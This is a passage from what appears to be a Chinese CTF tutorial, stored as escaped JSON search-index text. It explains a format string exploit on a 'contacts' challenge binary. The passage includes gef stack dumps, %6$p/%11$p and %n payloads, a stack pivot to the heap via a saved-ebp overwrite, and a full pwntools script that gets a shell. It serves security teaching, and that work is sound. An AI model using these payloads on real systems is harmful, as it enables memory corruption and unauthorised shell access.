\u4e2d\u6ca1\u6709\u63d0\u53ca\uff0c\u90a3\u5c31\u662f\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u5199\u5165\u5730\u5740\u3002\u539f\u56e0\u5f88\u7b80\u5355\uff1a\u901a\u8fc7\u5206\u6790\u7a0b\u5e8f\u77e5\u9053\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u662f\u5b58\u653e\u5728\u5806\u4e0a\uff0c\u800c\u5b57\u7b26\u4e32\u6307\u9488\u662f\u5728\u6808\u4e0a\uff0c\u5f88\u660e\u663e\u7684\u73b0\u8c61\u5c31\u662f\u6808\u4e0a\u4e0d\u662f\u5b57\u7b26\u4e32\u7684\u660e\u6587\uff0c\u800c\u662f\u5b57\u7b26\u4e32\u7684\u5806\u5730\u5740\uff0c\u5c31\u7b97\u6211\u4eec\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u8f93\u5165\u76ee\u6807\u5730\u5740\uff0c\u4e5f\u4e0d\u80fd\u901a\u8fc7\u504f\u79fb\u83b7\u53d6\u3002\uff08\u8fd9\u4e2a\u7a0b\u5e8f\u5168\u90e8\u53ef\u63a7\u8f93\u5165\u90fd\u653e\u5728\u5806\u4e0a\uff09\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u8f93\u5165\u76ee\u6807\u5730\u5740\uff0c\u627e\u6808\u4e0a\u73b0\u6709\u7684\u5730\u5740\u3002 \u8d85\u957f\u504f\u79fb\u80fd\u53d6\u5230\u503c\uff1f\u6211\u4eec\u5f53\u5b83\u662f\u53ef\u884c\u7684\u8bd5\u4e00\u8bd5\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5230\u63cf\u8ff0\u5806\u5757\u76f8\u5dee -0xf7fafed0 \uff0c\u504f\u79fb\u4e3a -1040105396 \uff0c\u6784\u9020\u5c1d\u8bd5\u4e00\u4e0b\uff1a \u5176\u6b21\uff0c\u4e0d\u80fd\u591f\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u7684\u662f\u56e0\u4e3a\u6211\u4eec\u5e76\u6ca1\u6709\u4e00\u5757\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u7684\u5730\u5740\u6765\u5b58\u50a8\u6211\u4eec\u7684\u5185\u5bb9\uff0c\u540c\u65f6\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u5f80\u6808\u4e0a\u76f4\u63a5\u5199\u5165 system_addr + 'bbbb' + addr of '/bin/sh\u2018 \u4f3c\u4e4e\u5e76\u4e0d\u73b0\u5b9e\u3002 \u6ce8\u89e3 \uff1a \u6362\u53e5\u4eba\u8bdd\u5c31\u662f\uff1a\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u76ee\u6807\u5730\u5740\uff0c\u53ea\u80fd\u5728\u6808\u4e0a\u901a\u8fc7\u504f\u79fb\u627e\u5730\u5740\uff0c\u800c\u6808\u4e0a\u6ca1\u6709\u6307\u5411 eip \u7684\u5730\u65b9\uff0c\u4e5f\u5c31\u627e\u4e0d\u5230 eip \u5730\u5740\uff0c\u5c31\u4e0d\u80fd\u4fee\u6539 eip \u7684\u503c\u3002 \u6ce8\u89e3 \uff1a \u5c31\u56e0\u4e3a\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u76ee\u6807\u5730\u5740\uff0c\u6240\u4ee5\u4e0d\u80fd\u7528 hijack GOT \u3001hijack retaddr \u3002 \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u600e\u4e48\u505a\u5462\uff1f\u6211\u4eec\u8fd8\u6709\u4e4b\u524d\u5728\u6808\u6ea2\u51fa\u8bb2\u7684\u6280\u5de7\uff0cstack pivoting\u3002\u800c\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u6070\u597d\u662f\u5806\u5185\u5b58\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u628a\u6808\u8fc1\u79fb\u5230\u5806\u4e0a\u53bb\u3002\u8fd9\u91cc\u6211\u4eec\u901a\u8fc7 leave \u6307\u4ee4\u6765\u8fdb\u884c\u6808\u8fc1\u79fb\uff0c\u6240\u4ee5\u5728\u8fc1\u79fb\u4e4b\u524d\u6211\u4eec\u9700\u8981\u4fee\u6539\u7a0b\u5e8f\u4fdd\u5b58 ebp \u7684\u503c\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u503c\u3002 \u53ea\u6709\u8fd9\u6837\u5728\u6267\u884c leave \u6307\u4ee4\u7684\u65f6\u5019\uff0c esp \u624d\u4f1a\u6210\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u503c\u3002\uff08leave \u6307\u4ee4\u7b49\u4e8e\uff1a mov esp,ebp;pop ebp; \uff09 \u540c\u65f6\uff0c\u56e0\u4e3a\u6211\u4eec\u662f\u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u8fdb\u884c\u4fee\u6539\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u77e5\u9053\u4fdd\u5b58 ebp \u7684\u5730\u5740\u4e3a\u591a\u5c11\uff0c\u800c\u8fd9\u65f6 PrintInfo \u51fd\u6570\u4e2d\u5b58\u50a8 ebp \u7684\u5730\u5740\u6bcf\u6b21\u90fd\u5728\u53d8\u5316\uff0c\u800c\u6211\u4eec\u4e5f\u65e0\u6cd5\u901a\u8fc7\u5176\u4ed6\u65b9\u6cd5\u5f97\u77e5\u3002\u4f46\u662f\uff0c \u7a0b\u5e8f\u4e2d\u538b\u5165\u6808\u4e2d\u7684 ebp \u503c\u5176\u5b9e\u4fdd\u5b58\u7684\u662f\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684\u4fdd\u5b58 ebp \u503c\u7684\u5730\u5740 \uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u5176 \u4e0a\u5c42\u51fd\u6570\u7684\u4fdd\u5b58\u7684 ebp \u7684\u503c\uff0c\u5373\u4e0a\u4e0a\u5c42\u51fd\u6570\uff08\u5373 main \u51fd\u6570\uff09\u7684 ebp \u6570\u503c \u3002\u8fd9\u6837\u5f53\u4e0a\u5c42\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u5373\u5b9e\u73b0\u4e86\u5c06\u6808\u8fc1\u79fb\u5230\u5806\u7684\u64cd\u4f5c\u3002 \u57fa\u672c\u601d\u8def\u5982\u4e0b \u9996\u5148\u83b7\u53d6 system \u51fd\u6570\u7684\u5730\u5740 \u901a\u8fc7\u6cc4\u9732\u67d0\u4e2a libc \u51fd\u6570\u7684\u5730\u5740\u6839\u636e libc database \u786e\u5b9a\u3002 \u6784\u9020\u57fa\u672c\u8054\u7cfb\u4eba\u63cf\u8ff0\u4e3a system_addr + 'bbbb' + binsh_addr \u4fee\u6539\u4e0a\u5c42\u51fd\u6570\u4fdd\u5b58\u7684 ebp(\u5373\u4e0a\u4e0a\u5c42\u51fd\u6570\u7684 ebp) \u4e3a \u5b58\u50a8 system_addr \u7684\u5730\u5740 -4 \u3002 \u6ce8\u89e3 \uff1a \u4e3a\u4ec0\u662f system_addr \u7684\u5730\u5740 -4 \uff1f\u662f\u56e0\u4e3a\u7a0b\u5e8f\u672b\u5c3e\u7684 leave;ret \u6267\u884c\u5b8c leave \u540e\uff0cesp \u662f\u6307\u5411 ebp \u7684\uff0c\u7136\u540e esp \u7684\u503c\u4f1a\u589e\u52a0\u4e00\u4e2a\u673a\u5668\u957f\u5ea6\uff08\u8fd9\u65f6 esp \u521a\u597d\u662f\u6307\u5411 eip \uff09\uff0c\u518d\u6267\u884c ret \u5c06 esp \u6307\u5411\u7684\u503c\u538b\u5165 eip \u4e2d\u3002 \u5f53\u4e3b\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u4f1a\u6709\u5982\u4e0b\u64cd\u4f5c\uff08\u7b2c\u4e00\u7b2c\u4e8c\u5408\u5e76\u7b49\u4e8e leave \uff09 move esp,ebp\uff0c\u5c06 esp \u6307\u5411 system_addr \u7684\u5730\u5740 - 4 pop ebp\uff0c \u5c06 esp \u6307\u5411 system_addr ret\uff0c\u5c06 eip \u6307\u5411 system_addr\uff0c\u4ece\u800c\u83b7\u53d6 shell\u3002","title":"\u5229\u7528\u601d\u8def"},{"location":"fmtstr/fmtstr_example/#_27","text":"\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u662f\u83b7\u53d6 system \u51fd\u6570\u5730\u5740\u3001/bin/sh \u5730\u5740\uff0c\u6808\u4e0a\u5b58\u50a8\u8054\u7cfb\u4eba\u63cf\u8ff0\u7684\u5730\u5740\uff0c\u4ee5\u53ca PrintInfo \u51fd\u6570\u7684\u5730\u5740\u3002 \u9996\u5148\uff0c\u6211\u4eec\u6839\u636e\u6808\u4e0a\u5b58\u50a8\u7684 libc_start_main_ret \u5730\u5740 (\u8be5\u5730\u5740\u662f\u5f53 main \u51fd\u6570\u6267\u884c\u8fd4\u56de\u65f6\u4f1a\u8fd0\u884c\u7684\u51fd\u6570) \u6765\u83b7\u53d6 system \u51fd\u6570\u5730\u5740\u3001/bin/sh \u5730\u5740\u3002\u6211\u4eec\u6784\u9020\u76f8\u5e94\u7684\u8054\u7cfb\u4eba\uff0c\u7136\u540e\u9009\u62e9\u8f93\u51fa\u8054\u7cfb\u4eba\u4fe1\u606f\uff0c\u5e76\u5c06\u65ad\u70b9\u4e0b\u5728 printf \u5904\uff0c\u5e76\u4e14\u4e00\u76f4\u8fd0\u884c\u5230\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684 printf \u51fd\u6570\u5904\uff0c\u5982\u4e0b \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [esp] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [esp] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffccfc', 'l8'] 8 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp 0xffffcd00\u2502+0x04: 0x0804c420 \u2192 \"1234567\" 0xffffcd04\u2502+0x08: 0x0804c410 \u2192 \"11111\" 0xffffcd08\u2502+0x0c: 0xf7e5acab \u2192 <puts+11> add ebx, 0x152355 0xffffcd0c\u2502+0x10: 0x00000000 0xffffcd10\u2502+0x14: 0xf7fad000 \u2192 0x001b1db0 0xffffcd14\u2502+0x18: 0xf7fad000 \u2192 0x001b1db0 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500 [#0] 0xf7e44670 \u2192 Name: __printf(format=0x804c420 \"1234567\\n\") [#1] 0x8048c27 \u2192 leave [#2] 0x8048c99 \u2192 add DWORD PTR [ebp-0xc], 0x1 [#3] 0x80487a2 \u2192 jmp 0x80487b3 [#4] 0xf7e13637 \u2192 Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, rtld_fini=0xf7fe88a0 <_dl_fini>, stack_end=0xffffce0c) [#5] 0x80485e1 \u2192 hlt \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 dereference $esp 140 ['$esp', '140'] 1 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp gef\u27a4 dereference $esp l140 ['$esp', 'l140'] 140 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp 0xffffcd00\u2502+0x04: 0x0804c420 \u2192 \"1234567\" 0xffffcd04\u2502+0x08: 0x0804c410 \u2192 \"11111\" 0xffffcd08\u2502+0x0c: 0xf7e5acab \u2192 <puts+11> add ebx, 0x152355 0xffffcd0c\u2502+0x10: 0x00000000 0xffffcd10\u2502+0x14: 0xf7fad000 \u2192 0x001b1db0 0xffffcd14\u2502+0x18: 0xf7fad000 \u2192 0x001b1db0 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp 0xffffcd1c\u2502+0x20: 0x08048c99 \u2192 add DWORD PTR [ebp-0xc], 0x1 0xffffcd20\u2502+0x24: 0x0804b0a8 \u2192 \"11111\" 0xffffcd24\u2502+0x28: 0x00002b67 (\"g+\"?) 0xffffcd28\u2502+0x2c: 0x0804c410 \u2192 \"11111\" 0xffffcd2c\u2502+0x30: 0x0804c420 \u2192 \"1234567\" 0xffffcd30\u2502+0x34: 0xf7fadd60 \u2192 0xfbad2887 0xffffcd34\u2502+0x38: 0x08048ed6 \u2192 0x25007325 (\"%s\"?) 0xffffcd38\u2502+0x3c: 0x0804b0a0 \u2192 0x0804c420 \u2192 \"1234567\" 0xffffcd3c\u2502+0x40: 0x00000000 0xffffcd40\u2502+0x44: 0xf7fad000 \u2192 0x001b1db0 0xffffcd44\u2502+0x48: 0x00000000 0xffffcd48\u2502+0x4c: 0xffffcd78 \u2192 0x00000000 0xffffcd4c\u2502+0x50: 0x080487a2 \u2192 jmp 0x80487b3 0xffffcd50\u2502+0x54: 0x0804b0a0 \u2192 0x0804c420 \u2192 \"1234567\" 0xffffcd54\u2502+0x58: 0xffffcd68 \u2192 0x00000004 0xffffcd58\u2502+0x5c: 0x00000050 (\"P\"?) 0xffffcd5c\u2502+0x60: 0x00000000 0xffffcd60\u2502+0x64: 0xf7fad3dc \u2192 0xf7fae1e0 \u2192 0x00000000 0xffffcd64\u2502+0x68: 0x08048288 \u2192 0x00000082 0xffffcd68\u2502+0x6c: 0x00000004 0xffffcd6c\u2502+0x70: 0x0000000a 0xffffcd70\u2502+0x74: 0xf7fad000 \u2192 0x001b1db0 0xffffcd74\u2502+0x78: 0xf7fad000 \u2192 0x001b1db0 0xffffcd78\u2502+0x7c: 0x00000000 0xffffcd7c\u2502+0x80: 0xf7e13637 \u2192 <__libc_start_main+247> add esp, 0x10 0xffffcd80\u2502+0x84: 0x00000001 0xffffcd84\u2502+0x88: 0xffffce14 \u2192 0xffffd00d \u2192 \"/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...]\" 0xffffcd88\u2502+0x8c: 0xffffce1c \u2192 0xffffd058 \u2192 \"XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\" \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7b80\u5355\u7684\u5224\u65ad\u53ef\u4ee5\u5f97\u5230 0xffffcd7c\u2502+0x80: 0xf7e13637 \u2192 <__libc_start_main+247> add esp, 0x10 \u5b58\u50a8\u7684\u662f __libc_start_main \u7684\u8fd4\u56de\u5730\u5740\uff0c\u540c\u65f6\u5229\u7528 fmtarg \u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u504f\u79fb\uff0c\u53ef\u4ee5\u770b\u51fa\u5176\u504f\u79fb\u4e3a 32\uff0c\u90a3\u4e48\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a 31\uff08\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728 0xffffcd00 \uff09\u3002 gef\u27a4 fmtarg 0xffffcd7c The index of format argument : 32 \u8fd9\u6837\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002\u8fdb\u800c\u53ef\u4ee5\u6839\u636e libc-database \u6765\u83b7\u53d6\u5bf9\u5e94\u7684 libc\uff0c\u7ee7\u800c\u83b7\u53d6 system \u51fd\u6570\u5730\u5740\u4e0e /bin/sh \u51fd\u6570\u5730\u5740\u4e86\u3002 \u5176\u6b21\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u6808\u4e0a\u5b58\u50a8\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740 0xffffcd2c \u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a 11\uff0c\u5f97\u5230\u8fd9\u4e2a\u662f\u4e3a\u4e86\u5bfb\u5740\u5806\u4e2d\u6307\u5b9a\u8054\u7cfb\u4eba\u7684 Description \u7684\u5185\u5b58\u9996\u5730\u5740\uff0c\u6211\u4eec\u5c06\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 [system_addr][bbbb][binsh_addr][%6p][p][p][bbbb] \u4fdd\u5b58\u5728\u6307\u5b9a\u8054\u7cfb\u4eba\u7684 Description \u4e2d\u3002 \u518d\u8005\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u4e0b\u9762\u7684\u5730\u5740\u4fdd\u5b58\u7740\u4e0a\u5c42\u51fd\u6570\u7684\u8c03\u7528\u5730\u5740\uff0c\u5176\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a 6\uff0c\u8fd9\u6837\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u4e0a\u5c42\u51fd\u6570\u5b58\u50a8\u7684 ebp \u7684\u503c\u3002 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp","title":"\u83b7\u53d6\u76f8\u5173\u5730\u5740\u4e0e\u504f\u79fb"},{"location":"fmtstr/fmtstr_example/#_28","text":"\u5f97\u77e5\u4e0a\u9762\u7684\u4fe1\u606f\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u4e0b\u9762\u7684\u65b9\u5f0f\u83b7\u53d6\u5806\u5730\u5740\u4e0e\u76f8\u5e94\u7684 ebp \u5730\u5740\u3002 [system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb] \u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u76f8\u5e94\u7684\u5730\u5740\u3002\u540e\u9762\u7684 bbbb \u662f\u4e3a\u4e86\u63a5\u53d7\u5b57\u7b26\u4e32\u65b9\u4fbf\u3002 \u8fd9\u91cc\u56e0\u4e3a\u51fd\u6570\u8c03\u7528\u65f6\u6240\u7533\u8bf7\u7684\u6808\u7a7a\u95f4\u4e0e\u91ca\u653e\u7684\u7a7a\u95f4\u662f\u4e00\u81f4\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u5230\u7684 ebp \u5730\u5740\u5e76\u4e0d\u4f1a\u56e0\u4e3a\u6211\u4eec\u518d\u6b21\u8c03\u7528\u800c\u6539\u53d8\u3002 \u6ce8\u89e3 \uff1a \u56e0\u4e3a PrintInfo \u80af\u5b9a\u662f\u901a\u8fc7 main \u51fd\u6570\u8c03\u7528\u7684\uff0c\u800c main \u51fd\u6570\u4e00\u76f4\u6ca1\u6709\u7ed3\u675f\uff0c\u4e5f\u5c31\u662f\u4e00\u76f4\u5728\u5185\u5b58\u7684\u67d0\u4e00\u56fa\u5b9a\u4f4d\u7f6e\u3002PrintInfo \u662f\u5728 main \u6808\u57fa\u7840\u4e0a\u5f80\u4f4e\u5730\u5740\u751f\u957f\u7684\uff0c\u6240\u4ee5\u53ea\u6709 PrintInfo \u7ed3\u6784\u56fa\u5b9a ebp \u5730\u5740\u4e5f\u4e0d\u4f1a\u56e0\u4e3a\u6211\u4eec\u518d\u6b21\u8c03\u7528\u800c\u6539\u53d8\u3002PrintInfo \u7ed3\u6784\u56fa\u5b9a\u662f\u56e0\u4e3a\u6240\u6709\u8f93\u51fa\u5185\u5bb9\uff08\u53f7\u7801\u3001\u63cf\u8ff0\u7b49\uff09\u90fd\u662f\u4ee5\u5806\u5806\u6307\u9488\u5f62\u5f0f\u5b58\u50a8\u7684\uff0c\u4e5f\u5c31\u662f\u65e0\u8bba\u957f\u5ea6\u5982\u4f55\u53d8\u5316\u5728\u6808\u4e0a\u6240\u5728\u7a7a\u95f4\u90fd\u662f\u4e0d\u53d8\u7684\uff0cebp \u7684\u504f\u79fb\u4e5f\u5c31\u662f\u56fa\u5b9a\u4e86\u3002 \u5728\u90e8\u5206\u73af\u5883\u4e0b\uff0csystem \u5730\u5740\u4f1a\u51fa\u73b0 \\ x00\uff0c\u5bfc\u81f4 printf \u7684\u65f6\u5019\u51fa\u73b0 0 \u622a\u65ad\u5bfc\u81f4\u65e0\u6cd5\u6cc4\u9732\u4e24\u4e2a\u5730\u5740\uff0c\u56e0\u6b64\u53ef\u4ee5\u5c06 payload \u7684\u4fee\u6539\u5982\u4e0b\uff1a [%6$p][%11$p][ccc][system_addr][bbbb][binsh_addr][dddd] payload \u4fee\u6539\u4e3a\u8fd9\u6837\u7684\u8bdd\uff0c\u8fd8\u9700\u8981\u5728 heap \u4e0a\u52a0\u5165 12 \u7684\u504f\u79fb\u3002\u8fd9\u6837\u4fdd\u8bc1\u4e86 0 \u622a\u65ad\u51fa\u73b0\u5728\u6cc4\u9732\u4e4b\u540e\u3002 [%6$p] \uff1a\u4e0a\u5c42\u51fd\u6570 ebp \u5730\u5740\uff1b [%11$p] \uff1a\u5806\u5757 fd \u6307\u9488\u5730\u5740\uff1b","title":"\u6784\u9020\u8054\u7cfb\u4eba\u83b7\u53d6\u5806\u5730\u5740"},{"location":"fmtstr/fmtstr_example/#ebp","text":"\u7531\u4e8e\u6211\u4eec\u9700\u8981\u6267\u884c leave\uff08 ~~move \u6307\u4ee4\u5c06 ebp \u8d4b\u7ed9 esp\uff0c\u5e76\u8fd8\u9700\u8981\u6267\u884c pop ebp~~ \uff09\u624d\u4f1a\u6267\u884c ret \u6307\u4ee4\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5c06 ebp \u4fee\u6539\u4e3a\u5b58\u50a8 system \u5730\u5740 -4 \u7684\u503c\u3002\u8fd9\u6837 move esp,ebp \u4e4b\u540e\uff0cesp \u6070\u597d\u6307\u5411\u4fdd\u5b58 system \u7684\u5730\u5740\uff0c\u8fd9\u65f6\u5728\u6267\u884c ret \u6307\u4ee4\u5373\u53ef\u6267\u884c system \u51fd\u6570\u3002 \u4e0a\u9762\u5df2\u7ecf\u5f97\u77e5\u4e86\u6211\u4eec\u5e0c\u671b\u4fee\u6539\u7684 ebp \u503c\uff0c\u800c\u4e5f\u77e5\u9053\u4e86\u5bf9\u5e94\u7684\u504f\u79fb\u4e3a 6\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0b\u7684 payload \u6765\u8fdb\u884c\u4fee\u6539\u76f8\u5e94\u7684\u503c\u3002(\u8fd9\u91cc\u662f wiki \u7684\u4fee\u6539\u65b9\u6cd5\uff0c\u56e0\u4e3awiki exp \u6211\u672c\u5730\u6253\u4e0d\u901a\uff0c\u6362\u6210\u81ea\u5df1\u7684\uff0c\u6240\u4ee5\u4fee\u6539\u65b9\u6cd5\u4e5f\u4e0d\u4e00\u6837) part1 = (heap_addr - 4) / 2 part2 = heap_addr - 4 - part1 payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'","title":"\u4fee\u6539 ebp"},{"location":"fmtstr/fmtstr_example/#shell","text":"\u8fd9\u65f6\uff0c\u6267\u884c\u5b8c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u4e4b\u540e\uff0c\u9000\u51fa\u5230\u4e0a\u4e0a\u51fd\u6570\uff0c\u6211\u4eec\u8f93\u5165 5 \uff0c\u9000\u51fa\u7a0b\u5e8f\u5373\u4f1a\u6267\u884c ret \u6307\u4ee4\uff0c\u5c31\u53ef\u4ee5\u83b7\u53d6 shell\u3002","title":"\u83b7\u53d6 shell"},{"location":"fmtstr/fmtstr_example/#_29","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : contacts.py from pwn import * context.log_level = 'debug' p = process(\"./contacts\") elf = ELF(\"./contacts\") #libc = ELF(\"/lib/i386-linux-gnu/libc.so.6\") # \u4f7f\u7528\u9898\u76ee\u63d0\u4f9b\u7684libc libc = ELF(\"./libc.so\") def creat(name,number,length,description): p.sendlineafter(\">>> \",'1') p.sendlineafter(\"Name: \",name) p.sendlineafter(\"No: \",number) p.sendlineafter(\"description: \",str(length)) p.sendlineafter(\"description:\\n\",description) def free(name): p.sendlineafter(\">>> \",'2') p.sendlineafter(\"remove? \",name) def edit(name,choose,newname='skye',length=10,description='skye'): p.sendlineafter(\">>> \",'3') p.sendlineafter(\"change? \",name) p.sendlineafter(\">>> \",str(choose)) if(choose==1): p.sendlineafter(\"name: \",newname) elif(choose==2): p.sendlineafter(\"description: \",str(length)) p.sendlineafter(\"Description: \\n\",description) def show(): p.sendlineafter(\">>> \",'4') # leak libc creat(\"skye\",\"skye\",24,'a'*4+\"%31$p\") show() p.recvuntil('a'*4) libc_start_main = int(p.recv(10),16) log.info(\"libc_start_main:\"+hex(libc_start_main)) libc_base = libc_start_main - 0x18637 log.info(\"libc_base:\"+hex(libc_base)) system_addr = libc_base + libc.symbols['system'] log.info(\"system_addr:\"+hex(system_addr)) binsh_addr = libc_base + libc.search('sh\\x00').next() log.info(\"binsh_addr:\"+hex(binsh_addr)) # leak ebp&heap addr # \u5c06system\u524d\u7f6e\u53ef\u80fd\u4f1a\u9047\u5230\\x00\u963b\u65ad\uff0c\u53ef\u81ea\u884c\u540e\u7f6e\uff0c\u5e76\u8c03\u6574ebp\u8986\u76d6\u503c payload = p32(system_addr) + 'bbbb' + p32(binsh_addr) + '%6$p%11$pcccc' creat('2222', 'skye', 0x20, payload) show() p.recvuntil('Description: ') data = p.recvuntil('cccc', drop=True) data = data.split('0x') ebp_addr = int(data[-2], 16) log.info(\"ebp_addr:\"+hex(ebp_addr)) heap_addr = int(data[-1], 16) log.info(\"heap_addr:\"+hex(heap_addr)) # overwrite main_ebp payload = '%{}c%6$n'.format(str(heap_addr-4)) creat('3333', 'skye', 68, payload) #gdb.attach(p,'b *0x0804876A') #raw_input('pause') show() #getshell p.recvuntil('>>> ') p.sendline('5') p.interactive() \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u6837\u5e76\u4e0d\u80fd\u7a33\u5b9a\u5f97\u5230 shell\uff0c\u56e0\u4e3a\u6211\u4eec\u4e00\u6b21\u6027\u8f93\u5165\u4e86\u592a\u957f\u7684\u5b57\u7b26\u4e32\u3002\u4f46\u662f\u6211\u4eec\u53c8\u6ca1\u6709\u529e\u6cd5\u5728\u524d\u9762\u63a7\u5236\u6240\u60f3\u8981\u8f93\u5165\u7684\u5730\u5740\u3002\u53ea\u80fd\u8fd9\u6837\u4e86\u3002 \u4e3a\u4ec0\u4e48\u9700\u8981\u6253\u5370\u8fd9\u4e48\u591a\u5462\uff1f\u56e0\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e0d\u5728\u6808\u4e0a\uff0c\u6240\u4ee5\u5c31\u7b97\u6211\u4eec\u5f97\u5230\u4e86\u9700\u8981\u66f4\u6539\u7684 ebp \u7684\u5730\u5740\uff0c\u4e5f\u6ca1\u6709\u529e\u6cd5\u53bb\u628a\u8fd9\u4e2a\u5730\u5740\u5199\u5230\u6808\u4e0a\uff0c\u5229\u7528 $ 